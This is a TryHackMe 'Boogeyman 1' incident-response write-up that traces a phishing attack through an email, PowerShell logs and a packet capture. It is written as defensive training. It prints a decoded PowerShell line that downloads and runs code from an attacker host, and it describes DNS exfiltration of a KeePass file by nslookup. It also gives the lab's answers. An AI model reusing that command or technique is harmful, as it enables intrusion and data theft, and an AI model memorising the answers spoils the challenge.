<div align="center">

# 👻 Boogeyman 1

*Uncover the secrets of the new emerging threat, the Boogeyman*

![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange)
![Category](https://img.shields.io/badge/Category-Incident%20Response-blue)
![Completed](https://img.shields.io/badge/Completed-4th%20of%20October%202026-green)

[![Open Room | TryHackMe](https://img.shields.io/badge/Open%20Room-TryHackMe-red?style=for-the-badge&logo=tryhackme)](https://tryhackme.com/room/boogeyman1)

*SOC Level 1 Path > Boogeyman 1*

</div>

<br>

---

<h2 align="center">📋 Summary</h2>

> A finance employee at Quick Logistics LLC opened a "follow-up on an unpaid invoice" email from a fake business partner. The attachment was a password-protected ZIP with a malicious shortcut (LNK) file inside. Opening it ran PowerShell, which pulled down a C2 script, enumerated the machine, grabbed a KeePass database and exfiltrated it over DNS. I traced the whole attack from the email, through the PowerShell logs, to the network capture, and finally rebuilt the stolen KeePass file to pull out a credit card number.

**Attack chain at a glance:**

```
Phishing email (fake invoice) -> encrypted ZIP -> malicious .lnk
  -> PowerShell downloads C2 stager from files.bpakcaging.xyz
  -> C2 over HTTP (cdn.bpakcaging.xyz), command output sent via POST
  -> Seatbelt enumeration + sq3.exe reads Sticky Notes database
  -> KeePass database (protected_data.kdbx) exfiltrated over DNS (hex + nslookup)
```

**Tools used:** Thunderbird, LNKParse3, jq, grep, sed, Wireshark, Tshark, KeePass

<br>

---

## Contents

- [Task 1: Introduction](#task-1-introduction)
- [Task 2: Email Analysis](#task-2-email-analysis)
- [Task 3: Endpoint Security](#task-3-endpoint-security)
- [Task 4: Network Traffic Analysis](#task-4-network-traffic-analysis)
- [Attack Timeline](#attack-timeline)
- [Lessons Learned](#lessons-learned)

<br>

---

## Task 1: Introduction

The goal of this room is to follow a threat group's TTPs from the very first phishing email all the way to their final objective.

I was given three artefacts in `/home/ubuntu/Desktop/artefacts`:

- `dump.eml` - a copy of the phishing email
- `powershell.json` - PowerShell logs from Julianne's workstation (converted from EVTX to JSON with evtx2json)
- `capture.pcapng` - a packet capture from the same workstation

**The scenario:** Julianne from the finance team at Quick Logistics LLC got an email about an unpaid invoice from their partner, B Packaging Inc. The attachment was malicious and compromised her workstation. Other people in finance reported the same email, so this looks like a targeted attack on the finance team. The initial TTP is linked to a new threat group called **Boogeyman**, known for going after the logistics sector.

My job: figure out what happened and how bad it is.

<br>

---

## Task 2: Email Analysis

The guide gave two options: rebuild the attachment by hand (base64 decode the blob at the bottom of the `.eml`), or just open the email in Thunderbird. I went the Thunderbird route since it's quicker and lets me read the headers and body comfortably.

I double-clicked `dump.eml` to open it in Thunderbird, then saved the attached file.

The attachment was an encrypted ZIP. The password was right there in the email body (a classic trick to get the file past email scanners), so I used it to extract the archive.

Inside was a `.lnk` file. I ran `lnkparse` on it to see what it actually does when opened.

```bash
lnkparse Invoice_20230103.lnk
```

Most of the answers in this task came from the email headers, the email body, or the `lnkparse` output.

<br>

---

### What is the email address used to send the phishing email?

The `From` field in Thunderbird showed the sender. The domain looks like "bpackaging" at first glance, but the letters are swapped - **bpakcaging**. A typosquatted domain meant to pass a quick look.

**✅ Answer:**
```
agriffin@bpakcaging.xyz
```

<br>

---

### What is the email address of the victim?

Straight from the `To` field.

**✅ Answer:**
```
julianne.westcott@hotmail.com
```

<br>

---

### What is the name of the third-party mail relay service used by the attacker based on the DKIM-Signature and List-Unsubscribe headers?

I looked through the raw headers. Both the `DKIM-Signature` (the `d=` domain) and the `List-Unsubscribe` link pointed to the same mail service.

**✅ Answer:**
```
elasticemail
```

<br>

---

### What is the name of the file inside the encrypted attachment?

This was the file I got after extracting the ZIP.

**✅ Answer:**
```
Invoice_20230103.lnk
```

<br>

---

### What is the password of the encrypted attachment?

The password was written in the email body itself.

**✅ Answer:**
```
Invoice2023!
```

<br>

---

### Based on the result of the lnkparse tool, what is the encoded payload found in the Command Line Arguments field?

In the `lnkparse` output I found the **Command Line Arguments** field. It contained a long base64 string passed to PowerShell. The `AA` patterns all over it gave away that it's UTF-16LE encoded, which is what PowerShell's `-EncodedCommand` uses.

Decoding it gave me:

```powershell
iex (new-object net.webclient).downloadstring('http://files.bpakcaging.xyz/update')
```

So the shortcut downloads a script from the attacker's server and runs it straight in memory. That's the starting point of everything that happens on the endpoint.

**✅ Answer:**
```
aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYgBwAGEAawBjAGEAZwBpAG4AZwAuAHgAeQB6AC8AdQBwAGQAYQB0AGUAJwApAA==
```

<br>

---

## Task 3: Endpoint Security

Now I knew how the attachment got in: a PowerShell command was run, and decoding it showed where the endpoint activity starts. Next step was the PowerShell logs to see what the attacker actually did.

The logs are JSON, so `jq` is the tool for the job. The room also warned that a lot of the logs are noise, so I focused on the `ScriptBlockText` field (the actual PowerShell code that ran) and sorted everything by time to read it like a story.

```bash
cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[] | {ScriptBlockText}'
```

<br>

---

### What are the domains used by the attacker for file hosting and C2? Provide the domains in alphabetical order.

Reading through the sorted script blocks, two attacker domains kept coming up: `files.bpakcaging.xyz` (where the payloads were downloaded from) and `cdn.bpakcaging.xyz` (the C2 that the machine kept checking in with).

> 📝 Format: a.domain.com,b.domain.com

**✅ Answer:**
```
cdn.bpakcaging.xyz,files.bpakcaging.xyz
```

<br>

---

### What is the name of the enumeration tool downloaded by the attacker?

This was visible in the same output - the attacker downloaded and ran **Seatbelt**, a well-known C# tool for host enumeration (it collects lots of security-relevant info about the machine).

**✅ Answer:**
```
Seatbelt
```

<br>

---

### What is the file accessed by the attacker using the downloaded sq3.exe binary? Provide the full file path with escaped backslashes.

The answer was in the output above too, but with this many logs, `grep` is the fastest way to pull out exactly what I need.

```bash
cat powershell.json | jq -s -c 'sort_by(.Timestamp) | .[] | {ScriptBlockText}' | grep -i "sq3.exe"
```

`sq3.exe` is a SQLite command-line binary, and it was pointed at a `.sqlite` file in the Sticky Notes app folder. The question asked for escaped backslashes, so every `\` becomes `\\`.

**✅ Answer:**
```
C:\\Users\\j.westcott\\AppData\\Local\\Packages\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\LocalState\\plum.sqlite
```

<br>

---

### What is the software that uses the file in Q3?

The folder name gives it away: `Microsoft.MicrosoftStickyNotes_...`. `plum.sqlite` is where Sticky Notes stores its notes. People often keep passwords in sticky notes, which is exactly why the attacker went for it.

**✅ Answer:**
```
Microsoft Sticky Notes
```

<br>

---

### What is the name of the exfiltrated file?

Further down the script blocks, the attacker read a `.kdbx` file and started sending it out.

**✅ Answer:**
```
protected_data.kdbx
```

<br>

---

### What type of file uses the .kdbx file extension?

A quick search on the extension confirmed it - `.kdbx` is a KeePass password database. So the attacker stole a whole password vault, and the Sticky Notes database might hold the master password for it.

**✅ Answer:**
```
keepass
```

<br>

---

### What is the encoding used during the exfiltration attempt of the sensitive file?

Looking at the script block that handled the `.kdbx` file, the file bytes were converted to **hex** before being sent. Hex only uses characters that are allowed in domain names, which matters for the next question.

**✅ Answer:**
```
hex
```

<br>

---

### What is the tool used for exfiltration?

Same script block: the hex data was split into chunks and sent as subdomains of the attacker's domain using **nslookup**. Each lookup carries a piece of the file out inside a DNS query.

**✅ Answer:**
```
nslookup
```

<br>

---

## Task 4: Network Traffic Analysis

From the PowerShell logs I now knew the full impact on the endpoint:

- The attacker read and exfiltrated two potentially sensitive files (the Sticky Notes database and the KeePass database).
- I had the domains, the ports and the exfiltration tool.

The last part was to confirm all of this in the packet capture and, ideally, rebuild the stolen file. Wireshark was my go-to here since it's network traffic and it's my favourite tool for it. I loaded `capture.pcapng` and filtered using the domains I already found.

Following the HTTP stream showed a lot about the requests and responses.

<br>

---

### What software is used by the attacker to host its presumed file/payload server?

The `Server` header in the HTTP response from the file server showed **SimpleHTTP / Python**. So the attacker just spun up a quick Python web server to host the payloads.

**✅ Answer:**
```
Python
```

<br>

---

### What HTTP method is used by the C2 for the output of the commands executed by the attacker?

In the C2 traffic, the victim pulled commands down with GET requests and sent the command output back up with **POST** requests.

**✅ Answer:**
```
POST
```

<br>

---

### What is the protocol used during the exfiltration activity?

This one connects straight to the `nslookup` finding from Task 3. The file left the network inside DNS queries.

**✅ Answer:**
```
DNS
```

<br>

---

### What is the password of the exfiltrated file?

The hint said to look for the database linked to `sq3.exe` from Task 3. My thinking: if the attacker read the Sticky Notes database, the output of that command should be sitting in one of the C2 POST requests.

I searched the HTTP streams for the `sq3.exe` command. The SQLite query in the request showed the table name - **NOTE**. That told me the attacker was dumping the actual notes.

If the command worked, the next stream should hold its output, so I checked it. The output didn't look like much at first - just a block of numbers. These were the decimal byte values of the command output, so I converted them back to text.

Inside the decoded notes was the master password for the KeePass database.

**✅ Answer:**
```
%p9^3!lL^Mz47E2GaT^y
```

<br>

---

### What is the credit card number stored inside the exfiltrated file?

Now I had the master password, so I just needed the `.kdbx` file itself. What I knew so far:

- the protocol (DNS)
- the attacker's domain (`bpakcaging.xyz`)
- the encoding (hex, split across subdomains)
- the destination IP from Wireshark

**First attempt (Tshark):** I built a Tshark query to pull out only the DNS queries to the attacker's domain.

That gave way too much output, so I trimmed it down to just the query names (the Tshark room covers the field options well).

Much better. I stripped out the domain parts so only the hex chunks were left.

More gibberish - but this time it was the hex of the file. I converted it and saved it with the `.kdbx` extension.

KeePass wouldn't open it. Something in the extraction went wrong (most likely duplicated or out-of-place queries in the output), so I switched approach.

**Second attempt (Wireshark export):** I filtered the DNS traffic in Wireshark by the destination IP address and exported the data straight from there.

Then `grep` did the hex extraction for me and `sed` cleaned it up.

The result started with a familiar file signature - this looked like a real KeePass file this time.

I saved it into a text file and converted the hex back into the binary `.kdbx` file.

KeePass asked for the master password, so I used the one from the Sticky Notes. It opened, and the credit card number was stored inside. That one felt really good after the failed first attempt.

**✅ Answer:**
```
4024007128269551
```

<br>

---

## Attack Timeline

| # | Stage | What happened | Evidence |
|---|-------|---------------|----------|
| 1 | Initial Access | Phishing email from `agriffin@bpakcaging.xyz` sent via Elastic Email to the finance team | `dump.eml` |
| 2 | Delivery | Encrypted ZIP (`Invoice2023!`) containing `Invoice_20230103.lnk` | Email attachment, lnkparse |
| 3 | Execution | LNK runs encoded PowerShell that downloads and runs a script from `files.bpakcaging.xyz` | lnkparse, PowerShell logs |
| 4 | Command & Control | Victim checks in with `cdn.bpakcaging.xyz`, sends command output back via HTTP POST | PowerShell logs, PCAP |
| 5 | Discovery | Seatbelt downloaded and run for host enumeration | PowerShell logs |
| 6 | Credential Access | `sq3.exe` dumps the Sticky Notes database (`plum.sqlite`), exposing the KeePass master password | PowerShell logs, PCAP |
| 7 | Collection | `protected_data.kdbx` (KeePass database) read from disk | PowerShell logs |
| 8 | Exfiltration | KeePass file hex-encoded and sent out in DNS queries with `nslookup` | PowerShell logs, PCAP |

<br>

---

<div align="center">

**And voilà, there you have it! 🎉**

</div>

<br>

---

## Lessons Learned

- **Typosquatted domains work.** `bpakcaging` vs `bpackaging` is easy to miss when you're busy. Always check the sender domain letter by letter.
- **Password-protected attachments are a red flag.** The password in the email body is there to stop email scanners from looking inside the file.
- **LNK files can hide a lot.** A "shortcut" can run a full PowerShell download-and-execute chain. `lnkparse` makes that visible in seconds.